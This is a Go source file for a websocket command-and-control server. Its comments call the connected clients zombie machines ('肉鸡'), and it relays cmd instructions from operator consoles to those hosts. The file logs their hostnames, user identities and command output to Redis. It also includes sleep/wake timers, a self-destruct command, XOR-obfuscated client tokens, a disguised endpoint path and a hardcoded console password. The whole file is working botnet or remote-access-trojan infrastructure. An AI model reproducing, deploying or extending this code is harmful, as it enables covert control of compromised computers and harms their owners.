package main

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/pkg/errors"
	"golang.org/x/net/websocket"
	"io/ioutil"
	"math/big"
	"mtcomm/db/redis"
	logger "mtcomm/log"
	"net/http"
	"strconv"
	"strings"
	"time"
)

const (
	SEND_MSG       = "0"   //一般信息，如cmd指令，cmd运行后返回值，提示信息等
	GET_HEART      = "10"  //客户端心跳（hostname信息）
	GET_IP_LIST    = "20"  //控制台获取ip列表
	UPDATE_REMARK  = "30"  //控制台修改备注信息
	GET_OUT_TEXT   = "40"  //控制台读取客户端保存的输出信息
	SLEEP_ROUSE    = "50"  //休眠/唤醒客户端
	ALL_SLEEP      = "000" //全部休眠
	CLEAN_OUT_TEXT = "60"  //控制台清空客户端输出信息
	KILL_ME        = "444" //杀了我
)

var (
	redisClient     redis.RedisClient
	clients_control = make(map[string]string)          //客户端ip和控制台uuid的对应
	control_clients = make(map[string]string)          //控制台uuid和客户端ip的对应
	control         = make(map[string]*websocket.Conn) //控制台uuid和控制台conn
	controlKey      = make(map[*websocket.Conn]string) //控制台conn连接和控制台uuid便于查找

	controlMsgs = make(chan Message, 500)          //发给控制端的消息
	clients     = make(map[string]*websocket.Conn) //客户端ip和客户端conn连接
	clientMsgs  = make(chan Message, 500)          //发给客户端的消息
	//clientSleepMsg  = map[string]Message{} //客户端睡眠时发给他的消息
)

//zsetKey
func redisIP() string {
	return "IP"
}

//客户端基础信息，备注信息,hostname,
func redisINFO(ip string) string {
	return "INFO:" + ip
}

//输入输出信息
func redisMSG(ip string) string {
	return "MSG:" + ip
}

//客户端sleep信息
func redisSLEEP(ip string) string {
	return "SLEEP:" + ip
}
func init() {
	redisClient = redis.NewRedisClient(&redis.RedisServerInfo{
		Ctx:           context.TODO(),
		Logger:        logger.GetDefaultLogger(),
		RedisHost:     "127.0.0.1:6379",
		RedisPassword: "",
	})
	_, _ = redisClient.Get("ping") //测试连接,连接错误直接panic退出
}

type Message struct {
	Uuid string `json:"uuid"`
	Ip   string `json:"ip"`
	Name string `json:"name"`
	Msg  string `json:"msg"`

	FileName string `json:"fileName"`
	FileBody string `json:"fileBody"`

	Condoms []*Condom `json:"condoms"`
}
type Condom struct {
	IP      string
	Name    string
	Whoami  string
	Remark  string
	Time    string
	checked bool
}

func checkConn(conn *websocket.Conn) (string, bool) {
	now := time.Now().Format("2006-01-02 15:04:05")
	Unow := time.Now().Unix()
	r := conn.Request()
	ip := RemoteIp(r)
	if token := r.Header.Get("Sec-Websocket-Protocol"); token != "" {
		tokenBytes, err := base64.StdEncoding.DecodeString(token)
		if err != nil {
			fmt.Println(now, ip, "此客户端验证信息base64失败：", token)
			return ip, false
		}
		tokenBytes = encDec(tokenBytes)
		tokenStr := string(tokenBytes)      //当前时间戳#mac地址
		spl := strings.Split(tokenStr, "-") //spl[0]当前时间戳   spl[1]mac地址
		if len(spl) != 2 {                  //不符合token规则
			fmt.Println(now, ip, "此客户端验证信息不符合token规则：", tokenStr)
			return ip, false
		}
		token64, _ := strconv.ParseInt(spl[0], 10, 64)
		token64 = Unow - token64
		if token64 >= -86400 && token64 <= 86400 { //误差一天内,验证成功
			ip = ip + " - " + spl[1]
			return ip, true
		} else {
			fmt.Println(now, ip, "此客户端token信息超过一天", token64)
			return ip, false
		}
	} else {
		fmt.Println(now, ip, "此客户端无验证信息")
		return ip, false
	}

}

//客户端
func svrConnClientHandler(conn *websocket.Conn) {
	defer conn.Close()
	//验证是否允许连接
	ip, flag := checkConn(conn)
	if flag == false {
		now := time.Now().Format("2006-01-02 15:04:05")
		fmt.Println(now, ip, "此客户端非法连接")
		return
	}
	now := time.Now().Format("2006-01-02 15:04:05")
	fmt.Println(now, ip)
	redisClient.Zadd(redisIP(), time.Now().Unix(), ip) //存redis zset 心跳
	//连上后先查看是否存在要接收的休眠消息,是的话先推送缓存的休眠消息
	sleepflag, err := redisClient.Get(redisSLEEP(ip))
	if err != nil {
		now := time.Now().Format("2006-01-02 15:04:05")
		fmt.Println(now, ip, "查询休眠错误", err)
		return
	}
	if sleepflag != "" { //有休眠
		msg := Message{Name: SLEEP_ROUSE, Msg: sleepflag, Ip: ip}
		err := sendMessage(msg, conn)
		if err != nil {
			fmt.Println(now, "缓存消息推失败", err)
			return
		}
		if msg.Msg == "0" { //解除休眠
			redisClient.Del(redisSLEEP(ip))
		} else {
			delete(clients, ip)
			return
		}

	}
	clients[ip] = conn //确认没休眠，存入连接池
	for {
		reqbyts, err := readMessage(conn) //接客户端收传回来的消息传给控制台
		if err != nil {
			delete(clients, ip)
			now := time.Now().Format("2006-01-02 15:04:05")
			fmt.Println(now, ip, "断开连接")
			break
		}
		reqbyts = encDec(reqbyts) //解密
		message, err := json2Message(reqbyts)
		if err != nil {
			now := time.Now().Format("2006-01-02 15:04:05")
			fmt.Println(now, ip, "解密后转Message错误:", reqbyts)
			delete(clients, ip)
			return
		}
		if message.Name == GET_HEART { //发送的（hostname）心跳信息
			redisClient.Zadd(redisIP(), time.Now().Unix(), ip) //存redis zset 心跳
			hostMap, err := json2Map([]byte(message.Msg))
			if err == nil { //没有错的情况下才保存、为了兼容上一个版本
				redisClient.Hmset(redisINFO(ip), hostMap) //保存客户端信息
			}
			message.Ip = ip
			clientMsgs <- message // 反应客户端
			continue              //心跳消息只服务器保存，无需发送到控制台
		} else if message.Name == SEND_MSG { //返回给控制台的信息
			err := redisClient.APPEND(redisMSG(ip), message.Msg+"\r\n")
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "客户端存历史消息失败：", err)
			}
		} else if message.Name == KILL_ME { //肉鸡已自杀
			redisClient.APPEND(redisMSG(ip), ip+" KILL OK!\r\n")
			delete(clients, ip)
			controlMsgs <- Message{Name: SEND_MSG, Ip: ip, Msg: ip + " KILL OK!\r\n"} //发给控制端状态
			break                                                                     //结束
		}

		message.Ip = ip
		controlMsgs <- message

	}
}

func controlLogin(conn *websocket.Conn) (string, bool) {
	now := time.Now().Format("2006-01-02 15:04:05")
	r := conn.Request()
	ip := RemoteIp(r)
	if token := r.Header.Get("Sec-Websocket-Protocol"); token != "" {
		tokenBytes, err := base64.StdEncoding.DecodeString(token)
		if err != nil {
			fmt.Println(now, ip, "此控制台登陆信息base64失败：", token)
			return ip, false
		}
		tokenBytes = encDec(tokenBytes)
		tokenStr := string(tokenBytes)
		if tokenStr == "ParkourLiu-ParkourLiu123" {
			return ip, true //登陆成功
		} else {
			fmt.Println(now, ip, "此控制台登陆账号密码错误：", token)
			return ip, false
		}

	} else {
		fmt.Println(now, ip, "此控制台无登陆信息：")
		return ip, false
	}

}

//控制台
func svrConnControlHandler(conn *websocket.Conn) {
	defer conn.Close()
	//验证是否允许连接
	_, flag := controlLogin(conn)
	if flag == false {
		return
	}
	for {
		reqbyts, err := readMessage(conn) //接收控制台的消息{要操作的IP,消息类型Type,消息内容}，发给客户端
		if err != nil {
			uuid := controlKey[conn]
			ip := control_clients[uuid]

			delete(control, uuid)
			delete(controlKey, conn)
			delete(control_clients, uuid)
			delete(clients_control, ip)

			now := time.Now().Format("2006-01-02 15:04:05")
			fmt.Println(now, uuid+"控制台关闭")
			break
		}
		reqbyts = encDec(reqbyts) //解密
		message, err := json2Message(reqbyts)
		if err != nil {
			return
		}

		if message.Name == SEND_MSG { //发给客户端的指令信息保存到redis
			now := time.Now().Format("2006-01-02 15:04:05")
			err := redisClient.APPEND(redisMSG(message.Ip), "█"+now+">"+message.Msg+"\r\n")
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "控制台存历史消息失败：", err)
			}
		} else if message.Name == GET_IP_LIST { //控制台获取客户端ip列表
			err = ipList(conn) //发送ip列表到控制台
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "控制台获取客户端ip列表失败：", err)
			}
			continue
		} else if message.Name == UPDATE_REMARK { //控制台修改客户端备注信息
			err := upRemark(message, conn)
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "控制台修改客户端备注失败：", err)
			}
			continue
		} else if message.Name == GET_OUT_TEXT { //控制台点击ip,读取客户端输出信息
			err := readOutText(message, conn)
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
			}
			continue
		} else if message.Name == CLEAN_OUT_TEXT { //清空客户端输出信息
			err := cleanOutText(message)
			if err != nil {
				now := time.Now().Format("2006-01-02 15:04:05")
				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
			}
			continue
		} else if message.Name == SLEEP_ROUSE { //休眠
			if message.Msg != "0" {
				if clientConn, ok := clients[message.Ip]; ok {
					clientConn.Close()
					delete(clients, message.Ip) //删除连接池中的连接
				}
				reM := Message{Ip: message.Ip, Name: SEND_MSG, Msg: "sleep " + message.Msg + " OK!"}
				sendMessage(reM, conn) //返回控制台休眠结果
			}
		} else if message.Name == ALL_SLEEP { //全部休眠
			allSleep(conn)
			continue
		}
		control[message.Uuid] = conn               // 控制台链接存起来
		controlKey[conn] = message.Uuid            // 反存一个便于查找
		clients_control[message.Ip] = message.Uuid //客户端。控制台的对应关系存储起来
		control_clients[message.Uuid] = message.Ip //反存一个便于查找
		clientMsgs <- message
	}
}

func pushClientMsg() { //发送消息到客户端
	for {
		msg := <-clientMsgs
		now := time.Now().Format("2006-01-02 15:04:05")
		if conn, ok := clients[msg.Ip]; ok { //查看此控制台操作的肉机是否连接中
			err := sendMessage(msg, conn)
			if err != nil {
				fmt.Println(now, "报错了", msg)
				clientSleepMsgCheck(msg) //判断指令并添加到缓存
				delete(clients, msg.Ip)  //删除连接池中的连接
			}
		} else {
			fmt.Println(now, "没连接", msg)
			clientSleepMsgCheck(msg) //判断指令并添加到缓存
		}
	}
}
func clientSleepMsgCheck(msg Message) {
	if msg.Name == SLEEP_ROUSE { //是唤醒/休眠指令
		redisClient.Set(redisSLEEP(msg.Ip), msg.Msg)
	} else { //非休眠指令直接返回提示
		msg.Name = SEND_MSG
		msg.Msg = msg.Ip + "貌似已休眠或者已丢失，请先尝试唤醒它吧！"
		controlMsgs <- msg
	}
}

func pushControlMsg() { //发送消息到控制台
	for {
		msg := <-controlMsgs
		if controlUuid, ok := clients_control[msg.Ip]; ok { //查看此客户端ip对应的控制台ip是否存在
			if conn, ok2 := control[controlUuid]; ok2 { //拿到此控制台的连接
				sendMessage(msg, conn)
			}
		}
	}
}

//发送websocket消息
func sendMessage(message Message, conn *websocket.Conn) error {
	jsonBytes, _ := json.Marshal(message) //结构体转json
	jsonBytes = encDec(jsonBytes)         //加密
	if conn != nil {
		_, err := conn.Write(jsonBytes) //发送消息
		return err
	} else {
		return errors.New("conn is null pointer")
	}

}

//休眠全部
func allSleep(conn *websocket.Conn) {
	msg := Message{Name: SEND_MSG}
	for ip, clientConn := range clients { //遍历线程池中连接
		result, _ := rand.Int(rand.Reader, big.NewInt(30)) //30以内真随机数
		sleepstr := fmt.Sprint(120 + result.Int64())
		redisClient.Set(redisSLEEP(ip), sleepstr) //休眠时间设置到redis中

		clientConn.Close()  //关闭与客户端的连接
		delete(clients, ip) //删除连接池中的连接
		msg.Msg = ip + " sleep " + sleepstr
		sendMessage(msg, conn)
	}
}

func cleanOutText(message Message) error {
	err := redisClient.Del(redisMSG(message.Ip)) //删除
	if err != nil {
		return err
	}
	return nil
}
func readOutText(message Message, conn *websocket.Conn) error {
	if uuid, ok := clients_control[message.Ip]; ok { //此客户端ip上一个被操作的控制端uuid是谁
		if control_clients[uuid] == message.Ip { //此uuid控制端现在操作的ip是我要操作的ip
			message.Uuid = uuid //这个人正在操作
		} else {
			message.Uuid = "" //没人操作,需要清空此uuid,以免冲突
		}
	} else {
		message.Uuid = "" //没人操作,需要清空此uuid,以免冲突
	}
	MSG, err := redisClient.Get(redisMSG(message.Ip))
	if err != nil {
		return err
	}
	message.Msg = MSG
	sendMessage(message, conn)
	return nil
}

func upRemark(message Message, conn *websocket.Conn) error {
	err := redisClient.Hset(redisINFO(message.Ip), "remark", message.Msg)
	if err != nil {
		return err
	}
	sendMessage(message, conn)
	return nil
}
func ipList(conn *websocket.Conn) error {
	unixNow := time.Now().Unix()
	datas, err := redisClient.ZrangeWithscores(redisIP(), 0, -1)
	if err != nil {
		return err
	}
	condoms := []*Condom{}
	for i := 0; i < len(datas)-1; i = i + 2 {
		condom := &Condom{}
		ip := datas[i]
		score := datas[i+1]
		scoreInt64, _ := strconv.ParseInt(score, 10, 64)
		values, _ := redisClient.Hmget(redisINFO(ip), "hostname", "whoami", "remark")
		if _, ok := clients[ip]; ok { //正在连接中的ip弄个小标签
			condom.IP = "*" + ip
		} else {
			condom.IP = ip
		}
		condom.Name = values[0]
		condom.Whoami = values[1]
		condom.Remark = values[2]
		condom.Time = fmt.Sprint(unixNow - scoreInt64) //转成string
		condoms = append(condoms, condom)

	}
	message := Message{Name: GET_IP_LIST, Condoms: condoms}
	sendMessage(message, conn)
	return nil

}
func json2Message(strByte []byte) (Message, error) {
	var dat Message
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

func json2Map(strByte []byte) (map[string]string, error) {
	var dat map[string]string
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

func readMessage(conn *websocket.Conn) ([]byte, error) {
again:
	fr, err := conn.NewFrameReader()

	if err != nil {
		return nil, err
	}
	frame, err := conn.HandleFrame(fr)
	if err != nil {
		return nil, err
	}
	if frame == nil {
		goto again
	}
	return ioutil.ReadAll(frame)
}
func checkActive() {
	for {
		for ip, conn := range clients { //验证客户端存活
			Unow := time.Now().Unix()
			UheartTime, _ := redisClient.Zscore(redisIP(), ip)
			if Unow-UheartTime > 60 { //一分钟没交互
				conn.Close()        //关闭
				delete(clients, ip) //删除
			}
		}
		time.Sleep(time.Minute) //休眠一分钟
	}
}
func main() {
	fmt.Println("启动。。。。")
	go pushClientMsg()  //发消息给客户端
	go pushControlMsg() //发消息给控制台
	//go checkActive()    //判断存活
	http.Handle("/hfuiefdhuiwe32uhi", websocket.Handler(svrConnClientHandler))
	http.Handle("/svrConnControlHandler", websocket.Handler(svrConnControlHandler))
	err := http.ListenAndServe(":80", nil);
	if err != nil {
		fmt.Println("监听端口80报错：", err)
	}
	fmt.Println("结束.");
}
